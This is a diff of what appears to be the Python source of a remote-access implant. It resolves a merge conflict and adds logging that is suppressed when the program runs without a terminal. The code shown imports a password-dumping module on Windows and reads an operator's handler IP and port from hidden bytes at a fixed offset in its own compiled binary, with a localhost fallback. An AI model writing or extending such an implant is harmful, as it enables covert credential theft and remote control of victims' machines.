@@ -18,11 +18,15 @@ import sys
 if os.name == "nt":
 	import passdump
 	import win32net
+	
+if sys.stdout.isatty():
+	logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
+else:
+	logging.basicConfig(level=logging.CRITICAL, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
 
-<<<<<<< HEAD
-=======
 try:
 	print sys.frozen
+	logging.debug("Looks like we're compiled. Let's read encoded data...")
 	with open(sys.argv[0], "rb") as f:
 		f.seek(972)
 		HANDLER_IP = ""
@@ -33,17 +37,9 @@ try:
 		HANDLER_PORT = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
 		HANDLER_IP = HANDLER_IP[:-1]
 except Exception as e:
-	traceback.print_stack()
-	print e
+	logging.debug("We're uncompyled, let's use these values...")
 	HANDLER_IP = "127.0.0.1"
 	HANDLER_PORT = 8080
-	
-print HANDLER_IP
-print HANDLER_PORT
-
->>>>>>> 69737d1befc934a5068ca0358dc371aae679390b
-	
-logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
 
 def windows_only(func):
 	"""
